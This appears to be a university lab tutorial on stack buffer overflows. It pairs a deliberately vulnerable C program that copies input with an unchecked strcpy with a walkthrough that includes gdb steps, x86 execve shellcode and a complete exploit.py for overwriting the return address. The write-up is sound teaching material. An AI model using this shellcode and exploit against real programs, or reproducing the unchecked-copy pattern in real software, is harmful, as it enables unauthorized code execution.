# Buffer Overflows
This is a tutorial of Stack Buffer Overflow attacks. Credit to 'Smashing The Stack For Fun And Profit by Aleph One' 
for a detailed description of how to do this and Manuel Egele megele@bu.edu for creating the challenge 
(specifically providing prog5.c and the template for how to create exploit.py).

Author: Chase Clarke cfclarke@bu.edu


# prog5.c source
```
//compile with $ gcc prog5.c -o prog5

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//check the string passed from the command-line and print message accordingly. Vulnerable program


int processInput(char *input)
{		
		char buffer[512];

		strcpy(buffer,input);

		printf("Hello, what is the magic word?: You said %s\n",buffer);

		/* check if the string is equal to the super secret string */

		if (strcmp(buffer,"Please please pretty please!")==0)
		{
				fprintf(stdout,"Woaaaa, you got it!\n");
		}
		else
		{
				fprintf(stdout,"Epic Fail! Epic Fail! Epic Fail! Epic Fail!\n");
		}

		/* great success! */
		return 0;
}

//program accepts two parameters, there is a simple buffer overflow...

int main(int argc, char **argv)
{
		//check arguments
		if (argc<2)
		{
				fprintf(stdout,"Synopsis: vuln1 <magic word>\n\n");
				exit(1);
		}

		//process the input
		processInput(argv[1]);

		return 0;
}
  
```

# Prog5 Stack


Stack after 'processInput' is called but before stack pointer returns to main:

```
Towards BOTTOM of stack - TOP of memory


	.           .     
	.           .     
	.           .     

	|           |
	|           |
	  ---------       =
	|           |     |
	|           |     |
	  ---------    vars passed into program
	| *input    |     |
	|           |     |
	  ---------       =
	| return    |
	| addr.     |
	  --------- 
	| EBP       |
	|           |
	  ---------       
        | ESP       |     
	|           |     
	  ---------       =
	|           |     |
	|           |     |
	         	local variables
	|           |     |
	| buffer    |     |
	    		  
	.           .     
	.           .     
	.           .     


Towards TOP of stack - BOTTOM of memory
```



So ===> 512 bytes for buffer, 8 bytes for stack and base pointers, 
	and the final 4 bytes for overwriting the return address 
	to main.


Now that you have an idea of what the stack looks like and where the stored eip pointer (return address to main) 
is stored, you are going to need code that opens a new shell.
A shell script is assembly built to open a new shell encoded so python can print it correctly.

The shell code I used: (source - http://shell-storm.org/shellcode/files/shellcode-811.php)
	
To make this as simple as possible, I used code from 'shell storm' instead of writing my own.

	* note that this shell code only works on Linux x86 systems. Find your systems code on shell-storm.org *
	* more on shell code: https://en.wikipedia.org/wiki/Shellcode *

	code used:	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2
			\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff



The last bit of information you need to collect is a new return address to replace the stored eip pointer.

You can get this using gdb:
	This is a tricky part because the address on the stack could change at any time if, for instance, any 
	environment variables change or the size of anything in your program changes.


Running gdb without the worry of environment variables:
	
	$ env - gdb prog5                    - clears most env vars. O/w stack cluttered and addresses constantly change

		(gdb) show env               - show remaining environment variables.
 
  		(gdb) unset env VARNAME      - remove one of the remaining set env vars
 
		(gdb) show env               - one last time to ensure all environment variables are removed


Helpful notes for using gdb:
* to run or rerun your program:
```
	(gdb) r "input_here"
```
* Set breakpoint:
```
	(gdb) b *main+offset - example: b *main+78
```
* delete breakpoint:
```
	(gdb) delete [breakpoints] [range...]
```

* print first 500 addresses stored on stack:
```
	(gdb) x/500xw $esp
```
	
* extra info:
```
	(gdb) info frame         - gives where your instruction pointer is at .  
	(gdb) info registers     - gives the values contained in all of your registers
```

Now that you have the program running correctly in gdb, you need to:
	
* Use the above notes to set a breakpoint the instruction before instructionProcess returns.
	
* Look at the stack at that time.
	
* Find an address that points directly back into your nops (no operation instruction in x86 assembly).

Save that address and use it as your new return address to replace the stored eip pointer.


Taking into account all the above, you will need 524 bytes total. 520 for buffer and stored pointers, 4 for overwriting 
the return address.

But you have one more problem. What do you do with the extra space in the buffer that is not used by your shell code?
Easy, padd it with nops. These are no operation assembly instructions that tell the system to just go to the next line. 
Encoded as '\x90'

So ===>

You can now write a python script that prints out the shell code at the correct size, padded by the nops:
```
	`python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89
		\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
```

you can launch your new shell by running the prog5 executable with the above python script as the input:
```
	$ prog5 `python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89
		\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
```


The process of manually creating these python scripts can be tedious. 
To remedy this you can create a python file (exploit.py) shown below that requires:

* The length in bytes from the start of the buffer to the start of the return address.

* The return address you found with gdb.


# exploit.py Source
```
#run with prog5 $(python exploit.py)

#!/usr/bin/env python

import sys, struct

#buf_len is the length of your input from the start of the buffer to the begging of the return address.
#ret_addr is the return address that brings you back into your NOPS. This will CHANGE regularly
buf_len = 520
ret_addr = 0xffff4ac0


#payload is the correctly presented shell code.
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


#combining all the above. '<' means little-endian in the struct.pack and 'L' signifies 64 bit OS.
buf = ('\x90' * (buf_len - len(payload))) + payload + struct.pack('<L', ret_addr)

#writing to the shell
sys.stdout.write(buf)
```
